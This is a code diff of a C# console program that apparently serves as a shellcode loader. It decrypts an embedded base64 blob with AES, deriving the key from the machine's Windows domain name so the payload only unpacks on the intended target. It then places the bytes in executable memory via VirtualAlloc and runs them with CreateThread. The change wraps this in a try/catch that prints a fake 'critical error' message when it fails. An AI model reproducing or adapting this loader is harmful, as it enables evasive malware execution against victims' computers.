@@ -30,37 +30,45 @@ namespace ConsoleApp4
 
             encodedReader.Close();
             reader.Close();
-
-            string EncryptionKey = System.Environment.UserDomainName;
-            string cipherText = encodedString.Replace(" ", "+");
-            byte[] cipherBytes = Convert.FromBase64String(cipherText);
-            using (Aes encryptor = Aes.Create())
+            try
             {
-                Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
-                encryptor.Key = pdb.GetBytes(32);
-                encryptor.IV = pdb.GetBytes(16);
-                using (MemoryStream ms = new MemoryStream())
+
+                string EncryptionKey = System.Environment.UserDomainName;
+                string cipherText = encodedString.Replace(" ", "+");
+                byte[] cipherBytes = Convert.FromBase64String(cipherText);
+                using (Aes encryptor = Aes.Create())
                 {
-                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
+                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
+                    encryptor.Key = pdb.GetBytes(32);
+                    encryptor.IV = pdb.GetBytes(16);
+                    using (MemoryStream ms = new MemoryStream())
                     {
-                        cs.Write(cipherBytes, 0, cipherBytes.Length);
-                        cs.Close();
+                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
+                        {
+                            cs.Write(cipherBytes, 0, cipherBytes.Length);
+                            cs.Close();
+                        }
+                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                     }
-                    cipherText = Encoding.Unicode.GetString(ms.ToArray());
                 }
+
+
+
+                byte[] base64Data = Convert.FromBase64String(cipherText);
+
+                IntPtr functionAddress = VirtualAlloc((uint)IntPtr.Zero, (uint)base64Data.Length, 0x00001000, 0x40);
+                Marshal.Copy(base64Data, 0, functionAddress, base64Data.Length);
+
+
+                IntPtr threadId = IntPtr.Zero;
+
+                IntPtr hThread = CreateThread(IntPtr.Zero, (uint)base64Data.Length, functionAddress, IntPtr.Zero, 0, threadId);
+                WaitForSingleObject(hThread, 0xFFFFFFFF);
             }
-
-            byte[] base64Data = Convert.FromBase64String(cipherText);
-
-            IntPtr functionAddress = VirtualAlloc((uint)IntPtr.Zero, (uint)base64Data.Length, 0x00001000, 0x40);
-            Marshal.Copy(base64Data, 0, functionAddress, base64Data.Length);
-
-
-            IntPtr threadId = IntPtr.Zero;
-
-            IntPtr hThread = CreateThread(IntPtr.Zero, (uint)base64Data.Length, functionAddress, IntPtr.Zero, 0, threadId);
-            WaitForSingleObject(hThread, 0xFFFFFFFF);
-
+            catch
+            {
+                Console.Write("Cannot execute program due to critical error.");
+            }
         }
     }
 }
